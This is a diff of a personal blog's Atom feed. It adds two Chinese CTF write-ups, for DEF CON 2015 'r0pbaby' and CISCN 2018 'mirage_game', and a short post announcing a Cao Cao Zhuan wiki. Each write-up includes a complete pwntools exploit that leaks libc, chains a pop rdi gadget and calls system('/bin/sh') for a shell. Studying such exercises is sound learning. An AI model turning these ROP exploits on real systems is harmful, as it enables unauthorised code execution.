@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lometsj.com/"/>
-  <updated>2018-05-03T14:53:34.105Z</updated>
+  <updated>2018-07-16T06:49:40.537Z</updated>
   <id>http://lometsj.com/</id>
   
   <author>
@@ -15,6 +15,70 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>defcon2015-r0pbaby</title>
+    <link href="http://lometsj.com/posts/6a17cd88/"/>
+    <id>http://lometsj.com/posts/6a17cd88/</id>
+    <published>2018-07-16T06:42:22.000Z</published>
+    <updated>2018-07-16T06:49:40.537Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="r0pbaby"><a href="#r0pbaby" class="headerlink" title="r0pbaby"></a>r0pbaby</h1><p>这个以前刚入门的时候做的老题了,作为入门rop的题目,十分直白.运行程序,我们可以得到libc地址,函数地址和一个栈溢出漏洞.<br>通过选项2得到system地址,由于题目提供了libc,这样我们可以用system实际地址减去它在libc中的偏移,算出libc的基地址.<br>求得linc的基地址可以让我们算出’/bin/sh’的实际地址,再在程序中需找一个起rdi的gadget把’/bin/sh’的地址送到参数,调用system函数即可</p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#0x0000000000021102 : pop rdi ; ret</span></div><div class="line"></div><div class="line">io = process(<span class="string">'./r0pbaby_542ee6516410709a1421141501f03760'</span>)</div><div class="line">lib = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line">gadget = <span class="number">0x21102</span></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">':'</span>)</div><div class="line">io.sendline(<span class="string">'2'</span>)</div><div class="line">io.recvuntil(<span class="string">'symbol:'</span>)</div><div class="line">io.sendline(<span class="string">'system'</span>)</div><div class="line">ret = io.recvuntil(<span class="string">'4) Exit\n:'</span>)</div><div class="line">left = ret.find(<span class="string">'0x'</span>)</div><div class="line">addr = int(ret[left:left + <span class="number">18</span>],<span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> hex(addr)</div><div class="line"></div><div class="line">libc_base = addr - lib.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">io.sendline(<span class="string">'3'</span>)</div><div class="line">io.recv()</div><div class="line">payload = <span class="string">'a'</span> * <span class="number">8</span> + p64(libc_base + gadget) + p64(libc_base + lib.search(<span class="string">'/bin/sh'</span>).next()) + p64(addr)</div><div class="line">io.sendline(<span class="string">'32'</span>)</div><div class="line">io.sendline(payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;r0pbaby&quot;&gt;&lt;a href=&quot;#r0pbaby&quot; class=&quot;headerlink&quot; title=&quot;r0pbaby&quot;&gt;&lt;/a&gt;r0pbaby&lt;/h1&gt;&lt;p&gt;这个以前刚入门的时候做的老题了,作为入门rop的题目,十分直白.运行程序,我们可以得到libc地址,
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ciscn2018半决赛-mirage_game</title>
+    <link href="http://lometsj.com/posts/f500597a/"/>
+    <id>http://lometsj.com/posts/f500597a/</id>
+    <published>2018-07-16T06:39:18.000Z</published>
+    <updated>2018-07-16T06:41:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>程序是一个简单的memcpy溢出,需要注意一次base64转换,通过puts泄漏地址计算libc_base,构造system(“/bin/sh”)即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"><span class="comment">#0x0000000000403383 : pop rdi ; ret</span></div><div class="line"></div><div class="line">io = process(<span class="string">'./mirage_game'</span>)</div><div class="line">elf = ELF(<span class="string">'./mirage_game'</span>)</div><div class="line">lib = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line">write_got = elf.got[<span class="string">'write'</span>]</div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line"></div><div class="line"></div><div class="line">pre = <span class="string">'RPCM'</span></div><div class="line">pre += <span class="string">'\x00\x00\x00\x0c'</span></div><div class="line">pre += <span class="string">'\x00\x00\x00\x00'</span></div><div class="line">io.send(pre)</div><div class="line">io.recv(<span class="number">12</span>)</div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'RPCM'</span></div><div class="line">payload += <span class="string">'\x00\x00\x00\x0c'</span></div><div class="line">payload += <span class="string">'\x00\x00\x00\x42'</span></div><div class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></div><div class="line">io.send(payload)</div><div class="line"></div><div class="line"></div><div class="line">io.recvuntil(<span class="string">':)\n'</span>)</div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x30</span> + fakeebp</div><div class="line">payload1 += p64(<span class="number">0x403383</span>)  +p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'sfadkjf'</span>])</div><div class="line">payload1 = base64.b64encode(payload1)</div><div class="line">io.sendline(payload1)</div><div class="line">r = io.recv()</div><div class="line"></div><div class="line">write_addr = u64(r.split(<span class="string">'\n'</span>)[<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr: "</span> + hex(write_addr)</div><div class="line">libc_base = write_addr - lib.symbols[<span class="string">'puts'</span>]</div><div class="line">system_addr = libc_base + lib.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x30</span> + fakeebp</div><div class="line"><span class="keyword">print</span> hex(lib.search(<span class="string">'/bin/sh'</span>).next())</div><div class="line">payload2 += p64(<span class="number">0x403383</span>) + p64(libc_base + lib.search(<span class="string">'/bin/sh'</span>).next()) + p64(system_addr)</div><div class="line">payload2 = base64.b64encode(payload2)</div><div class="line">io.sendline(payload2)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;程序是一个简单的memcpy溢出,需要注意一次base64转换,通过puts泄漏地址计算libc_base,构造system(“/bin/sh”)即可&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ccz</title>
+    <link href="http://lometsj.com/posts/4bd00c2d/"/>
+    <id>http://lometsj.com/posts/4bd00c2d/</id>
+    <published>2018-07-16T05:01:09.000Z</published>
+    <updated>2018-07-16T05:06:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="这是一个关于ccz的计划"><a href="#这是一个关于ccz的计划" class="headerlink" title="这是一个关于ccz的计划"></a>这是一个关于ccz的计划</h1><p>早年我在初中的时候特别喜欢暗荣出品的&lt;&lt;曹操传&gt;&gt;,同时也在cczmod的圈子活动了一段时间.<br>当然,这个圈子人越来越少,轩辕也时常无法访问.<br>我决定上线一个ccz wiki,作为一个时代的记录吧.</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;这是一个关于ccz的计划&quot;&gt;&lt;a href=&quot;#这是一个关于ccz的计划&quot; class=&quot;headerlink&quot; title=&quot;这是一个关于ccz的计划&quot;&gt;&lt;/a&gt;这是一个关于ccz的计划&lt;/h1&gt;&lt;p&gt;早年我在初中的时候特别喜欢暗荣出品的&amp;lt;&amp;lt;曹操传&amp;
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>ALICTF 2016 vss</title>
